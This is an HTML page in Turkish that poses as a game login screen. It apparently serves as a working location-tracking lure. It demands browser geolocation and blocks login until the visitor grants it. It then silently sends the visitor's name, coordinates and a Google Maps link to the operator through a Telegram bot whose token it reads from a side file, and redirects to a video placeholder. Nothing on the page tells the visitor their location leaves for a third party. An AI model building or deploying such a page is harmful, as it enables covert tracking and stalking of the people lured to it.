<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>GiriÅŸ SayfasÄ±</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #f0f0f0, #d0eaff);
      text-align: center;
      padding-top: 100px;
    }
    input, button {
      padding: 10px;
      font-size: 16px;
      margin: 10px;
    }
    #uyari {
      color: red;
      font-weight: bold;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h2>ğŸ® GiriÅŸ Yap</h2>
  <input type="text" id="username" placeholder="AdÄ±nÄ±zÄ± girin">
  <br>
  <button onclick="girisYap()">ğŸš€ GiriÅŸ Yap</button>
  <div id="uyari"></div>

  <script>
    let konum = null;
    let konumAlindi = false;

    // Sayfa aÃ§Ä±lÄ±r aÃ§Ä±lmaz konum izni iste
    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          konum = {
            lat: position.coords.latitude,
            lon: position.coords.longitude
          };
          konumAlindi = true;
        }, function(error) {
          konumAlindi = false;
        });
      } else {
        konumAlindi = false;
      }
    };

    async function girisYap() {
      const name = document.getElementById("username").value.trim();
      const uyari = document.getElementById("uyari");
      uyari.textContent = "";

      if (!konumAlindi) {
        uyari.textContent = "ğŸ“ Bu site iÃ§in konum izni gerekiyor!";
        return;
      }

      if (!name) {
        uyari.textContent = "ğŸ§  Ä°sim yaz adamÄ±m, bir isime ihtiyacÄ±n var!";
        return;
      }

      // bilgiler.txt dosyasÄ±nÄ± oku
      const response = await fetch("bilgiler.txt");
      const text = await response.text();
      const botToken = text.match(/BOT_TOKEN=(.*)/)[1].trim();
      const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();

      const mapsLink = `https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
      const message = `ğŸ® Yeni GiriÅŸ!\n\nğŸ‘¤ Ä°sim: *${name}*\nğŸ“ Konum: *${konum.lat}, ${konum.lon}*\nğŸŒ Harita: [Google Maps](${mapsLink})`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown"
      };

      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      // Videoya yÃ¶nlendir
      window.location.href = "-videouzantÄ±koy-";
    }
  </script>
</body>
</html>
